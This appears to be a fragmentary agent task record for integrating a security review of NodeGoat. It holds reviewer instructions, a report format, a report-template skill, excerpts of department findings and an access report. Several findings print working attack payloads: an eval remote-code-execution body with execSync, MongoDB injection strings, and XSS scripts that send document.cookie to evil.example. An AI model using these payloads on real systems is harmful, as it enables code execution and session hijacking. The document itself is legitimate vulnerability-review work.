header.system:
You are an AI agent powered by DeepSeek Harness.

You are the integrating analyst of a code-safety review. Six departments have each committed `findings/<department>.json` and `report/<department>.md` on their own branch, and this worktree is the merge of all of them. You write two files and nothing else: `findings.json` and `SAFETY-REPORT.md`.

Read `REPORTING.md` in this worktree first: it states the finding format, the exact sections of the report, the count lines both summaries carry, and the certificate's wording. Read `target.json` for the tree under review and the SHA-256 the certificate states. Read every `findings/*.json` and every `report/*.md` before writing anything. When a `report-template` skill is available, load it: it owns how the report reads, while `REPORTING.md` owns what the examiner mechanically decides and wins wherever the two differ in form.

Ask the examiner which findings do not hold before you write the union:

    for f in findings/*.json; do node verify-safety-report.mjs --findings "$f" --list-invalid; done

Every id it prints is dropped from `findings.json` and named under `## What was not covered`, with the reason. Dropping one silently fails the report.

`findings.json` is the union, deduplicated by `file` plus `line` plus `cwe`, keeping the entry whose `confidence` is higher. Copy each entry whole; do not rewrite a department's `snippet`, because the examiner compares it with the target's own text.

The report is a review by a language model, grounded by a static scanner and by the committed examiner, over the files the departments actually read. `## Scope and method` says that, names the departments that ran and the tools that ran, and states what was read rather than what exists. `## What was not covered` is not a formality: name the file kinds nobody opened, the classes of defect no department owns, the checks that did not run, and every dropped finding. Never write that the target is secure, safe or free of vulnerabilities — nothing this program did could support it, and the examiner refuses the claim.

Before you stop, run `node verify-safety-report.mjs --report`, fix every line it names, and commit everything. Work left uncommitted is not delivered and is not measured. Never write into the target tree, and never edit `verify-safety-report.mjs`, `target.json` or any department's committed files.


Use the read tool — not shell commands like cat — to inspect text files. Results include line numbers. Use offset and limit to continue reading large files.

Use the write tool to create files or completely replace file contents. Existing files are overwritten, so read an existing file first (the default fs-observation-policy requires it) and prefer edit for targeted changes.

Use the edit tool for targeted changes to existing UTF-8 text files. It replaces literal old_string with new_string; by default old_string must appear exactly once. If old_string appears multiple times, provide a more specific old_string or set replace_all to true. Read the file first (the default fs-observation-policy requires it), unless you just created or edited it in this session.

Use the glob tool — not shell find — to discover files by path pattern. A pattern with no "/" matches basenames at any depth, so "*" matches every file in the tree rather than its top level. Results are files only, never directories, and include hidden and ignored files: a result that fits comes back in modification-time order, while a larger one is sampled across top-level entries, so it spans the tree instead of one subtree.

Use the grep tool — not shell grep or rg — to search file contents. Use read on a matched file when you need surrounding context.

Check the [exit code: N] marker on every bash result; investigate failures before moving on.

Track every background job id you start. You are notified in-session when a job finishes — do not busy-poll or sleep on one; keep working on independent steps and do not duplicate a running job's work. Before giving a final answer, collect every still-relevant job with job_output (set wait: true only when you are genuinely blocked on it), and job_kill jobs that stopped mattering.

tools.name: bash
tools.description: Execute a bash command (`bash -c`) and return its stdout/stderr. Each call runs in a fresh shell: no state (cwd, variables, functions) persists between calls — pass `workdir` instead of using `cd`. Non-zero exits are reported as `[exit code: N]`. Current harness environment facts are exposed through managed `$DSH_*` variables; inspect them when needed. Commands may run under a file sandbox; a blocked file operation is reported as `[sandbox: file access denied under <mode> mode]` — a policy denial, not a bug in the command; do not retry another way. Long output is truncated to its tail; the full output is saved to a file whose path is reported when available. Set `run_in_background: true` for long-running commands: the call returns a job id immediately; read its output with `job_output` and stop it with `job_kill`.

description.description: Clear, concise description of what this command does in active voice, 5-10 words (shown in the UI). Examples: "ls" → "List files in current directory"; "git status" → "Show working tree status"; "npm install" → "Install package dependencies".

timeoutMs.description: Timeout in milliseconds. The executor applies its configured default and cap, and kills the command on expiry.

workdir.description: Working directory for this command. Defaults to the session workspace; a relative path is resolved against it.

run_in_background.description: Run in the background and return a job id immediately (collect with job_output, stop with job_kill). No timeout applies.

tools.name: edit
tools.description: Edit an existing UTF-8 text file by replacing literal text.

file_path.description: Path to edit, resolved by the filesystem backend.

old_string.description: Literal text to replace. Must match exactly.

new_string.description: Literal replacement text. Use an empty string to delete the match.

replace_all.description: Replace all matches. Defaults to false; when false, old_string must appear exactly once.

tools.name: glob
tools.description: Find files whose paths match a glob pattern. Returns matching file paths — never directories — including hidden and ignored files (VCS metadata directories are excluded). Up to 100 paths come back in modification-time order; a larger result instead returns 100 paths sampled across top-level entries, says so, and reports where the complete sorted list was saved. This tool does not enumerate directory entries.

pattern.description: Glob pattern to match file paths against (e.g. "**/*.ts", "src/**/*.test.js"). A pattern with no "/" matches the basename at any depth, so "*" and "*.ts" both search the whole tree; include a separator to anchor the depth.

path.description: Directory to search in. Defaults to the session workspace; a relative path resolves against it.

tools.name: grep
tools.description: Search file contents with a ripgrep regular expression. Returns matching lines with line numbers, grouped by file. Returns the first 250 matches inline; a capped result reports where the complete match list was saved. Use read on a matched file for surrounding context.

pattern.description: Regular expression to search for (ripgrep syntax).

path.description: File or directory to search. Defaults to the session workspace; a relative path resolves against it.

include.description: One glob filter for which files to search (e.g. "*.ts", "*.{js,jsx}"). Not a list; negation is not supported.

tools.name: job_kill
tools.description: Request cancellation of a running background job by job id. Returns immediately; the job settles as killed once its work actually stops.

job_id.description: Job id returned by the tool that started the background work.

reason.description: Optional short reason, recorded in the log and forwarded to the job.

tools.name: job_list
tools.description: List your background jobs (running and finished) with their ids, kinds, and statuses.

tools.name: job_output
tools.description: Read a background job. Stream jobs return only output since the previous read; final-output jobs return their result after settlement. Every response ends with `[status: ...]`. Reads are non-blocking unless `wait: true`, which waits up to the configured cap.

job_id.description: Job id returned by the tool that started the background work.

wait.description: Block until the job reaches a terminal status or the timeout expires. A timed-out wait returns [status: running] and leaves the job alive.

timeout_ms.description: Max wait in milliseconds (only meaningful with wait: true). Defaults to the configured wait timeout; capped by the configured maximum.

tools.name: read
tools.description: Read a UTF-8 text file and return line-numbered content.

file_path.description: Path to read, resolved by the filesystem backend.

offset.description: 1-based first line to return. Defaults to 1.

limit.description: Maximum number of lines to return. Defaults to 2000.

tools.name: skill
tools.description: Load the full instructions for an available skill. Call this with the exact skill name from the session skill catalog before acting on a task that names or clearly matches that skill.

name.description: The exact skill name from the available skills list.

tools.name: write
tools.description: Create or fully replace a UTF-8 text file.

file_path.description: Path to write, resolved by the filesystem backend.

content.description: Full UTF-8 text content to write.

1: # How this program reports what it found
2: 
3: This worktree is the **report repository**. The code under review is the **target tree**, which is somewhere else on this host: `target.json` beside this file states its absolute path, the files it covers, and the SHA-256 the whole tree locks to.
4: 
5: The target is read-only for every session of this program. `verify-safety-report.mjs` re-hashes every locked file on every run, so a target a department edited fails the program instead of releasing a report about a tree that no longer exists.
6: 
7: ## This file and the skills
8: 
9: When the deployment mounts the code-safety knowledge pack, its `review-method`, `severity-and-evidence` and `report-template` skills own the craft: how to read a codebase, how to score a severity, what evidence has to name, and how the report reads. Follow them.
10: 
11: This file owns what `verify-safety-report.mjs` mechanically decides, and it is binding wherever the two differ in form. There is one such place and it is stated below: the counts each summary carries are written as `- <severity>: <count>` lines so the examiner can compare them with the union, which is the machine-readable form of the skill's "counts per severity".
12: 
13: ## What a department delivers
14: 
15: Two files, both committed on the department's own branch:
16: 
17: - `findings/<department>.json` — a JSON array of findings, `[]` when the department found nothing.
18: - `report/<department>.md` — the department's own prose: what it looked at, what it found, and what it did not reach.
19: 
20: Nothing else. Do not write `SAFETY-REPORT.md`, `findings.json`, `target.json` or `verify-safety-report.mjs`: the first two are the integration's, and the last two are the examiner.
21: 
22: ## The evidence rule
23: 
24: A finding without a file and a line is not a finding. Quote the exact line you cite; `verify-safety-report.mjs` compares your `snippet` with the target's own text at that line, ignoring only whitespace, and refuses the whole file when they differ.
25: 
26: Prefer three findings you have read the code for over twelve a pattern matched. `confidence` is what you actually know: `confirmed` when you read the sink, the source and the path between them; `likely` when the sink is dangerous and the source is plausibly attacker-controlled; `possible` when the pattern is there and the reachability is not established.
27: 
28: ## The finding
29: 
30: ```json
31: {
32:   "id": "secrets-cookie-secret",
33:   "cwe": "CWE-798",
34:   "owasp": "A07:2021 Identification and Authentication Failures",
35:   "severity": "high",
36:   "confidence": "confirmed",
37:   "title": "Session cookie secret is hard-coded in the committed configuration",
38:   "file": "config/env/all.js",
39:   "line": 8,
40:   "snippet": "cookieSecret: \"session_cookie_secret_key_here\",",
41:   "evidence": "The value is a literal in a committed file and is the secret express-session is configured with.",
42:   "impact": "Anyone with the repository can forge a session cookie and authenticate as any user.",
43:   "fix": "Read the secret from the environment and rotate the committed value.",
44:   "references": ["https://cwe.mitre.org/data/definitions/798.html"]
45: }
46: ```
47: 
48: | Field | Rule |
49: | --- | --- |
50: | `id` | letters, digits, dots, dashes or underscores, unique across the whole program; prefix it with your department or use the pack's `SEC-<n>` numbering. |
51: | `cwe` | `CWE-<number>`. |
52: | `owasp` | the OWASP Top 10 category, named. |
53: | `severity` | `critical`, `high`, `medium`, `low` or `info`. |
54: | `confidence` | `confirmed`, `likely` or `possible`. |
55: | `title` | one line a reader can act on. |
56: | `file` | path relative to the target root, exactly as `target.json` lists it. |
57: | `line` | 1-based line in that file. |
58: | `endLine` | optional last line when the finding spans several; `snippet` then quotes all of them. |
59: | `snippet` | the target's own text at those lines, verbatim. |
60: | `evidence` | why this line is the vulnerability, naming what you read. |
61: | `impact` | what an attacker gets. |
62: | `fix` | what to change. |
63: | `references` | array of URLs or identifiers; may be empty. |
64: 
65: ## Checking your own work before you commit
66: 
67: ```sh
68: node verify-safety-report.mjs --findings findings/<department>.json
69: ```
70:

lines.text: # How this program reports what it found

This worktree is the **report repository**. The code under review is the **target tree**, which is somewhere else on this host: `target.json` beside this file states its absolute path, the files it covers, and the SHA-256 the whole tree locks to.

The target is read-only for every session of this program. `verify-safety-report.mjs` re-hashes every locked file on every run, so a target a department edited fails the program instead of releasing a report about a tree that no longer exists.

When the deployment mounts the code-safety knowledge pack, its `review-method`, `severity-and-evidence` and `report-template` skills own the craft: how to read a codebase, how to score a severity, what evidence has to name, and how the report reads. Follow them.

This file owns what `verify-safety-report.mjs` mechanically decides, and it is binding wherever the two differ in form. There is one such place and it is stated below: the counts each summary carries are written as `- <severity>: <count>` lines so the examiner can compare them with the union, which is the machine-readable form of the skill's "counts per severity".
Two files, both committed on the department's own branch:
- `findings/<department>.json` — a JSON array of findings, `[]` when the department found nothing.
- `report/<department>.md` — the department's own prose: what it looked at, what it found, and what it did not reach.
Nothing else. Do not write `SAFETY-REPORT.md`, `findings.json`, `target.json` or `verify-safety-report.mjs`: the first two are the integration's, and the last two are the examiner.

A finding without a file and a line is not a finding. Quote the exact line you cite; `verify-safety-report.mjs` compares your `snippet` with the target's own text at that line, ignoring only whitespace, and refuses the whole file when they differ.

Prefer three findings you have read the code for over twelve a pattern matched. `confidence` is what you actually know: `confirmed` when you read the sink, the source and the path between them; `likely` when the sink is dangerous and the source is plausibly attacker-controlled; `possible` when the pattern is there and the reachability is not established.
"title": "Session cookie secret is hard-coded in the committed configuration",
"evidence": "The value is a literal in a committed file and is the secret express-session is configured with.",
"impact": "Anyone with the repository can forge a session cookie and authenticate as any user.",
"fix": "Read the secret from the environment and rotate the committed value.",
| `id` | letters, digits, dots, dashes or underscores, unique across the whole program; prefix it with your department or use the pack's `SEC-<n>` numbering. |
| `title` | one line a reader can act on. |
| `file` | path relative to the target root, exactly as `target.json` lists it. |
| `endLine` | optional last line when the finding spans several; `snippet` then quotes all of them. |
| `snippet` | the target's own text at those lines, verbatim. |
| `evidence` | why this line is the vulnerability, naming what you read. |
| `references` | array of URLs or identifiers; may be empty. |
## Checking your own work before you commit
That is the same command your goal is measured by. Run it, fix what it names, then commit everything — work left uncommitted is not delivered and is not measured.

Every id that command prints is dropped from `findings.json` and named under `## What was not covered`, with the reason the examiner gave. Dropping one silently fails the report: `--report` refuses a union that omits an id no section discloses.

This review does not certify the absence of vulnerabilities; it certifies only that each listed finding was mechanically verified to exist at the cited line, over the files listed in "Scope and method".

<skill_content name="report-template">
<skill_resources>
Base directory for this skill: /home/user/deepseek-harness/data/knowledge/code-safety/report-template
Resolve relative paths mentioned by this skill against the base directory before using them. Load referenced resources only as needed.

<skill_instructions>
# The report layout

Every report has exactly these sections, in this order. Do not add marketing language, severity totals presented as a score out of ten, or a remediation timeline the review has no authority to commit the customer to.

- **`## Résumé exécutif`** — French. Counts per severity, the three most important findings by name and effect, what was and was not covered in one sentence each, and one paragraph on method.
- **`## Executive summary`** — the same content in English, for a mixed-language or non-French reader.
- **`## Scope and method`** — the repository, commit or tag reviewed, which directories or services were in scope, and a link to [review-method](../review-method/SKILL.md).
- **`## Findings`** — grouped by severity, critical first; one bullet per finding with its id, title, `file:line`, CWE, and confidence. Full detail (snippet, evidence, impact, fix) lives in the accompanying JSON per [severity-and-evidence](../severity-and-evidence/SKILL.md), not duplicated in prose here.
- **`## What was not covered`** — the [review-method](../review-method/SKILL.md) not-covered list, specific to this engagement.
- **`## Certificate`** — what a mechanical verifier checked after the fact: every finding resolves to a real file and line in the reviewed commit, every id is unique, every CWE/OWASP id is a known identifier, and no two findings share file, line, and CWE. This certifies the report's internal consistency, not the completeness or correctness of the review's judgment.

## Filled example: a small Express app

```markdown
## Résumé exécutif

Cette revue a porté sur le code source de commande-api, une application Express.js
de gestion de commandes, au commit a1b2c3d. Elle a permis d'identifier 3 constats :
1 critique, 1 moyen et 1 faible. Les plus importants : (1) une injection SQL
critique dans la recherche de commande par identifiant (src/routes/orders.js:42),
permettant de lire ou modifier toute donnée accessible par l'utilisateur de base de
données de l'application ; (2) une fixation de session lors de la connexion
(src/routes/auth.js:58) ; (3) l'absence de l'en-tête HSTS (src/app.js:12). La revue
a couvert les points d'entrée HTTP, l'authentification et la gestion des sessions ;
elle n'a pas couvert l'infrastructure de déploiement ni les dépendances tierces
(voir « Ce qui n'a pas été couvert »). Méthode : lecture des points d'entrée,
suivi des données de la source jusqu'au point d'exécution, un constat par point
d'exécution, ligne exactement citée et niveau de confiance déclaré pour chacun.

## Executive summary

This review covered commande-api, an Express.js order-management application, at
commit a1b2c3d, and found 3 issues: 1 critical, 1 medium, 1 low. The most
important: (1) a critical SQL injection in order lookup by id
(src/routes/orders.js:42); (2) session fixation on login
(src/routes/auth.js:58); (3) a missing HSTS header (src/app.js:12). HTTP entry
points, authentication, and session handling were covered; deployment
infrastructure and third-party dependencies were not (see "What was not covered").

## Scope and method

Repository commande-api, commit a1b2c3d, `src/` only. Method: [review-method](../review-method/SKILL.md).

## Findings

### Critical
- SEC-001 — SQL injection in order lookup — `src/routes/orders.js:42` — CWE-89 — confirmed

### Medium
- SEC-002 — Session id not rotated after login (session fixation) — `src/routes/auth.js:58` — CWE-384 — likely

### Low
- SEC-003 — Missing Strict-Transport-Security header — `src/app.js:12` — CWE-319 — confirmed

## What was not covered

- `infra/` (Terraform, Dockerfiles) and CI/CD configuration.
- Third-party dependency advisories (separate engagement).
- Runtime configuration: actual deployed environment variables, WAF rules, and network topology.
- Native mobile or memory-safety classes of bug: this codebase has no native module.

## Certificate

Mechanically verified: 3/3 findings resolve to an existing line at commit a1b2c3d;
3/3 ids unique; 3/3 CWE and OWASP ids recognized; 0 findings share file, line, and
CWE. This certifies internal consistency only, not completeness of coverage.
```
</skill_instructions>
</skill_content>

"impact": "forever is an operational process manager, not something normally on the HTTP request path; the prototype-pollution issues in its config/argument-parsing dependencies matter mainly if forever is run against untrusted config files or arguments, which would then corrupt Object.prototype for the whole process.",

"fix": "Upgrade to forever@4.0.3 (a semver-major jump) which drops the vulnerable flatiron/nconf/optimist chain, or replace forever with a maintained process supervisor (pm2, systemd) since forever's own upstream activity is sparse.",
"title": "helmet (^2.0.0, installed 2.3.0) is four major versions behind and its transitive chain carries a ReDoS advisory",

"title": "body-parser (^1.15.1, installed 1.18.3) is below the version that fixes a request-parsing DoS",

"snippet": "const preTax = eval(req.body.preTax);\nconst afterTax = eval(req.body.afterTax);\nconst roth = eval(req.body.roth);",

"evidence": "app/routes/index.js:52 wires POST /contributions to contributionsHandler.handleContributionsUpdate (guarded only by isLoggedIn, no role check). That handler reads req.body.preTax, req.body.afterTax and req.body.roth directly and passes each straight into eval() with no type check, allowlist, or parseInt() beforehand (a commented-out parseInt-based fix sits directly below at lines 38-40, confirming the intended, unapplied mitigation). Any authenticated user controls the string evaluated as JavaScript on the server.",

"impact": "An authenticated user (any role) submits a body such as preTax=require('child_process').execSync('id') to POST /contributions and that string is executed as Node.js code in the server process, giving full remote code execution and complete compromise of the application server.",

"fix": "Never eval() request data. Use Number(req.body.preTax) or parseInt(req.body.preTax, 10) as the comment in the file already suggests, and reject the request if the result is not a finite, in-range number before it reaches any further logic.",
"title": "NoSQL injection via unescaped $where clause built from a query-string threshold",

"evidence": "app/routes/allocations.js:19-23 takes threshold straight from req.query (no isAdmin check, only isLoggedIn) and passes it unmodified to allocationsDAO.getByUserIdAndThreshold. app/data/allocations-dao.js:57-79 builds a MongoDB $where clause (server-side JavaScript evaluated per document) by interpolating that raw threshold into a template literal at line 78, then app/data/allocations-dao.js:86 executes it with allocationsCol.find(searchCriteria()). The file's own comment at lines 63-76 documents the intended fix (parseInt + range check) that was never applied to the active code path.",

"impact": "An authenticated user can supply GET /allocations/<userId>?threshold=1'%3B while(true){} to trigger a denial-of-service infinite loop inside MongoDB's JS evaluator, or a payload such as 1' || '1'=='1 to break out of the intended comparison and read allocation records belonging to any user, not just the one named in the URL.",

"fix": "Never build $where from request input. Use parseInt(threshold, 10) with a bounds check and pass stocks/threshold as separate query fields (e.g. {userId: parsedUserId, stocks: {$gt: parsedThreshold}}) instead of a $where string.",
"title": "NoSQL operator injection in login lookup via JSON request body",

"evidence": "server.js:71 registers bodyParser.json(), so req.body.userName can be a JSON object rather than a string. app/routes/session.js:53-58 destructures userName straight from req.body and passes it unchanged to userDAO.validateLogin, which places it as the value of the userName key in usersCol.findOne({userName: userName}) at user-dao.js:91-93 with no type check or string coercion anywhere on the path.",

"impact": "An unauthenticated attacker can POST /login with Content-Type: application/json and a body such as {\"userName\":{\"$regex\":\"^a\"},\"password\":\"x\"}; MongoDB evaluates the operator instead of an exact match, letting the attacker enumerate valid usernames and select an arbitrary user record via boolean/regex-based probing. Password comparison still happens in application code (user-dao.js:60-61) so this alone does not disclose the password, but it defeats the intended exact-match lookup and is a live injection into the query.",

"fix": "Reject any req.body.userName (and password) that is not a string before it reaches the DAO, e.g. `if (typeof userName !== \"string\") return next(new Error(\"invalid\"))`, or use a schema validator (Joi/celebrate) on the login route.",
"title": "Open redirect via unvalidated url query parameter",

"evidence": "The GET /learn handler at app/routes/index.js:70-73 takes req.query.url directly, with no allowlist or same-origin check, and passes it straight to res.redirect(); the comment on the preceding line calls this out as the intentionally insecure pattern.",

"impact": "An attacker sends a victim a link such as https://nodegoat-host/learn?url=https://evil.example/phish; because the link's host is the trusted application, the victim is more likely to follow it, and the app then redirects the already-authenticated browser to the attacker's phishing or malware site.",
"fix": "Validate req.query.url against an allowlist of known-safe destinations (or internal paths only) before calling res.redirect(), and reject/ignore the parameter otherwise.",
"title": "Reflected XSS via unescaped firstName echoed back on profile validation failure",
"snippet": "<input type=\"text\" class=\"form-control\" id=\"firstName\" name=\"firstName\" value=\"{{firstNameSafeString}}\" placeholder=\"Enter first name\">",

"evidence": "server.js:135-137 calls swig.setDefaults({autoescape: false}), disabling HTML escaping for every {{ }} expression in every template. app/routes/profile.js:40-76 destructures firstName from req.body and, when the bankRouting regex fails validation, assigns it unmodified to firstNameSafeString (line 64: 'const firstNameSafeString = firstName;' -- no encoding despite the name) and renders the profile template with it at line 65-75. profile.html:41 interpolates that value into an HTML attribute with autoescaping off, so no encoding occurs anywhere on the path.",

"impact": "POST /profile with firstName=\"><script>fetch('//evil.example/c?'+document.cookie)</script> and any bankRouting value that fails the regex causes the script to execute in the submitting user's own browser in the immediate response. Because CSRF protection is disabled application-wide (server.js:104-113, the entire csrf() block is commented out) and the session cookie has no httpOnly flag configured (server.js:92-100, also commented out), an attacker can host a page that auto-submits this POST as any logged-in victim and then read the victim's session cookie via document.cookie, taking over their session.",

"fix": "Re-enable autoescape (swig.setDefaults({autoescape: true})) or, at minimum, HTML-encode firstName before assigning it to firstNameSafeString (e.g. with node-esapi's encodeForHTML, already used elsewhere in this file for the website field).",
"title": "Stored XSS via unescaped profile fields persisted to MongoDB and re-rendered",
"snippet": "<input type=\"text\" class=\"form-control\" id=\"lastName\" name=\"lastName\" value=\"{{lastName}}\" placeholder=\"Enter last name\">",

"evidence": "app/routes/profile.js:40-50 destructures lastName (plus ssn, dob, address, bankAcc, bankRouting) straight from req.body and passes it to profile.updateUser. app/data/profile-dao.js:42-63 stores each field verbatim into the users collection via $set with no sanitization, then app/routes/profile.js:100-104 re-renders the profile page with the DAO's returned object, and app/routes/profile.js:13-37 (displayProfile) does the same on every subsequent GET /profile from the stored document. profile.html:45 interpolates lastName with no escaping because server.js:135-137 disables Swig autoescape globally; the same unescaped pattern also applies to {{ssn}} (line 49), {{dob}} (line 53), {{bankAcc}} (line 57), {{bankRouting}} (line 61) and {{address}} (line 66) in this same template.",

"impact": "A user stores lastName=<script>document.location='//evil.example/c?'+document.cookie</script> via POST /profile; the payload persists in MongoDB and executes every time /profile is subsequently rendered for that account. Combined with the disabled CSRF protection (server.js:104-113) an attacker can plant this payload into a victim's own profile via a forged cross-site request, and combined with the missing httpOnly cookie flag (server.js:92-100) the resulting script can read and exfiltrate the victim's session cookie, yielding full account takeover.",

"fix": "Re-enable Swig's autoescape globally (swig.setDefaults({autoescape: true})), or HTML-encode each of these fields at render time; also validate/sanitize these fields server-side before persisting them.",
"title": "Stored XSS visible to every user via unescaped Markdown rendering of memo content",

"evidence": "app/routes/memos.js:11-17 stores req.body.memo verbatim via memosDAO.insert with no sanitization (app/data/memos-dao.js:15-24). app/routes/memos.js:19-33 (displayMemos) then loads every memo in the collection with getAllMemos, with no per-user filter, and renders memos.html, which at line 31 outputs marked(doc.memo) through Swig's {{ }} with autoescape globally disabled (server.js:135-137). marked is registered as a raw app.local (server.js:129, 'app.locals.marked = marked') so its HTML output is written straight into the page. server.js:126-128 sets marked.setOptions({sanitize: true}), a guard against raw HTML in the markdown source; I did not have marked's node_modules source available in this read-only tree to confirm that this deprecated 0.3.5-era sanitize option actually blocks script-bearing markdown constructs (e.g. link/image syntax with a javascript: URI), so I could not fully verify the guard holds and mark this 'likely' rather than 'confirmed'.",

"impact": "Any authenticated user can POST /memos with a markdown payload; because getAllMemos returns every memo to every logged-in user (not just the author), a successful bypass of the sanitize option would run in the browser of every user who opens /memos, including an admin, and combined with the missing httpOnly cookie flag (server.js:92-100) would let an attacker harvest any viewer's session cookie.",

"fix": "Do not rely on the deprecated marked 'sanitize' option; render memo Markdown to HTML server-side and pass it through a maintained HTML sanitizer such as DOMPurify (or sanitize-html) immediately before output, and re-enable Swig autoescape globally so any future unescaped variable does not become a silent XSS sink.",

"snippet": "secret: cookieSecret,
        // Both mandatory in Express v4
        saveUninitialized: true,
        resave: true",

"evidence": "`saveUninitialized: true` stores a session record for every request, authenticated or not, and `resave: true` re-persists it on every request even when nothing changed. No `cookie.maxAge` is set anywhere in the session() call (the only maxAge reference is a TODO comment at line 94), so the session cookie is a browser-session cookie with no server-side expiry once express-session's own defaults are used.",

"impact": "Sessions accumulate indefinitely in whatever session store is configured (MemoryStore by default, since no store option is set), which is both a memory-exhaustion risk under load and means a stolen session id (see platform-cookie-flags-missing) remains valid far longer than necessary.",

"fix": "Set `saveUninitialized: false`, keep `resave: false` once the store supports touch, and set an explicit, bounded `cookie.maxAge`; back the store with a persistent, capacity-limited session store (e.g. connect-mongo) rather than the in-memory default.",
"title": "CSRF protection is installed as a dependency but never mounted; every state-changing route accepts unprotected form posts",

"evidence": "`csurf` is a declared dependency (package.json) and required at line 7 (`// const csrf = require('csurf');`), but both the require and the middleware that would mount it are commented out. I checked every POST route registered in app/routes/index.js - /login, /signup, /profile, /contributions, /benefits, /memos - and none of their handlers (session.js, profile.js, contributions.js, benefits.js, memos.js) read or verify a CSRF token; the only state carried between requests is the session cookie, which (per platform-cookie-flags-missing) has no SameSite attribute either.",

"impact": "Any page an authenticated victim visits can submit a cross-site form to, for example, POST /profile or POST /contributions, and the browser will attach the session cookie automatically; the server has no token to check, so the forged request succeeds and changes the victim's data.",

"fix": "Uncomment the csurf middleware and the res.locals.csrftoken wiring, include the token as a hidden field in every state-changing form in app/views, and reject requests that omit or mismatch it.",
"title": "Global error handler renders the raw error object back to the client",

"evidence": "The errorHandler (mounted last, app/routes/index.js line 82, so it does see every downstream error) logs `err.message` and `err.stack` to the server console (lines 7-8) and then also passes the same `err` object into the `error-template` view as `error: err`. app/views/error-template.html line 11 renders it directly with `
{{error}}` and swig's global autoescape is disabled (server.js line 137), so whatever `err.toString()`/property values contain - including driver or validation error text bubbled up from a DAO - is sent straight into the HTML response with no redaction.",

"impact": "Any unhandled error in a route (a MongoDB driver error, a thrown validation error, etc.) surfaces its internal message text to the requesting browser, helping an attacker fingerprint the backend, query structure, or file paths.",

"fix": "In the error handler, log the full error server-side only, and render a generic message plus a correlation id: `res.render('error-template', { error: { id: correlationId, message: 'An error occurred' } })`.",
"title": "The /learn route redirects to an attacker-supplied URL taken straight from the query string",

"evidence": "`req.query.url` is attacker-controlled input from the request URL. It reaches `res.redirect()` at line 72 with no validation, no allowlist of destination hosts, and no check that it is a relative path; the only guard on the route is `isLoggedIn`, which checks authentication, not the redirect target.",

"impact": "An attacker sends a logged-in victim a link like `/learn?url=https://evil.example/phish`; the app itself redirects the victim there, which is more convincing than a bare external link and can be used for phishing or to bounce an OAuth-style token through a trusted domain.",

"fix": "Validate the destination against an allowlist of known hosts/paths (the route already only ever links to a fixed khanacademy.org URL from layout.html line 62), or resolve the target and reject anything that is not a relative, same-origin path.",
"title": "No rate limiting or lockout on the login and signup routes",
"snippet": "// Login form\n    app.get(\"/login\", sessionHandler.displayLoginPage);\n    app.post(\"/login\", sessionHandler.handleLoginRequest);",

"evidence": "`POST /login` at line 34 is wired straight to `sessionHandler.handleLoginRequest` (app/routes/session.js line 53) with no middleware in front of it besides body/session parsing mounted in server.js; `handleLoginRequest` calls `userDAO.validateLogin` on every request with no attempt counter, delay, or lockout. package.json lists no rate-limiting dependency (`express-rate-limit`, `express-brute`, etc.), and a repository-wide search for `rate-limit`/`rateLimit`/`express-brute` found nothing. The same is true for `POST /signup` at line 38.",
"impact": "An attacker can script unlimited password guesses against any known username at /login (or account-enumeration/mass-signup abuse at /signup) with no server-side throttling.",
"fix": "Add a rate limiter (e.g. `express-rate-limit`) keyed by IP and by submitted username on /login and /signup, and consider an incrementing lockout/backoff stored per account.",
"title": "Config defaults to the development environment when NODE_ENV is unset, injecting a live-reload script and debug settings into every page",

"evidence": "If the process is started without NODE_ENV set (the Dockerfile and package.json's `npm start` script do not set it), `finalEnv` resolves to \"development\" and config.js loads config/env/development.js, which sets `environmentalScripts` to an array containing a raw `<script>` tag that loads `livereload.js` from the requesting host (development.js lines 9-13), plus a hard-coded `zapApiKey`. Every render call in app/routes/session.js (displayLoginPage, displaySignupPage, handleLoginRequest, handleSignup, displayWelcomePage) passes `environmentalScripts` straight into the view, and app/views/layout.html line 126 emits it with `{{script}}` inside a `{% for %}` loop with swig's global autoescape disabled (server.js line 137), so the raw markup is written into every page unescaped.",

"impact": "A deployment that forgets to set NODE_ENV=production ships a script on every page (login, signup, dashboard, etc.) that has the browser fetch and execute `http://<host>:35729/livereload.js`, and exposes a hard-coded API key value in the config object logged to the console (config.js lines 12-13). This is exactly the class of 'debug settings left enabled in production' misconfiguration, reachable purely by omission.",

"fix": "Fail closed instead of defaulting to development: require NODE_ENV to be explicitly set to \"production\" for a production start script, or move environmentalScripts and any debug-only script injection out of the shared config path entirely so a missing NODE_ENV cannot re-enable it.",

1: # Access department report — authentication, session handling, authorization
2: 
3: ## Scope and method
4: 
5: Target: `/root/targets/NodeGoat` (111 files locked by `target.json`, sha256 `78ac112b7bd5083bb065086c4642dcd8a3932a8d3052f9405503124c90a70fe3`). This is a language-model review grounded by a static scanner (semgrep) and by this program's mechanical examiner (`verify-safety-report.mjs`); it is not a certification of security.
6: 
7: `semgrep --version` reported `1.177.0`, so semgrep was run: `semgrep --config <local code-safety pack> --config p/owasp-top-ten --metrics off --json /root/targets/NodeGoat` (72 files scanned, 113 rules, 29 findings). Every semgrep hit was treated only as a place to read, never as a finding on its own; the access-relevant hit (missing `httpOnly`/`secure`/`expires` on the `express-session` call at `server.js:78`) was independently read and confirmed by hand and is reported below. The other hits (NoSQL `$where` injection, `eval()` on request input, open redirect, hardcoded secrets, plaintext-HTTP links in tutorial pages, GitHub Actions mutable tags) belong to other departments (injection, secrets, platform, dependencies) and are not re-reported here.
8: 
9: Route table built by reading every handler registered in `app/routes/index.js` and the router it mounts (`app/routes/tutorial.js`), with the full middleware chain in front of each:
10: 
11: | Route | Method | Chain | Handler read |
12: | --- | --- | --- | --- |
13: | `/` | GET | none | session.js `displayWelcomePage` |
14: | `/login` | GET/POST | none | session.js `displayLoginPage` / `handleLoginRequest` |
15: | `/signup` | GET/POST | none | session.js `displaySignupPage` / `handleSignup` |
16: | `/logout` | GET | none | session.js `displayLogoutPage` — calls `req.session.destroy()`, correctly ends the session |
17: | `/dashboard` | GET | `isLoggedIn` | session.js `displayWelcomePage` |
18: | `/profile` | GET/POST | `isLoggedIn` | profile.js |
19: | `/contributions` | GET/POST | `isLoggedIn` | contributions.js |
20: | `/benefits` | GET/POST | `isLoggedIn` (isAdmin exists but commented out) | benefits.js |
21: | `/allocations/:userId` | GET | `isLoggedIn` | allocations.js — takes `:userId` from the URL, not the session |
22: | `/memos` | GET/POST | `isLoggedIn` | memos.js — global memo list, no per-user scoping |
23: | `/learn` | GET | `isLoggedIn` | open redirect via `req.query.url` (injection/platform territory, not reported here) |
24: | `/research` | GET | `isLoggedIn` | research.js — SSRF via `req.query.url` (injection territory) |
25: | `/tutorial/*` | GET | none | static tutorial pages, no state change, out of scope |
26: 
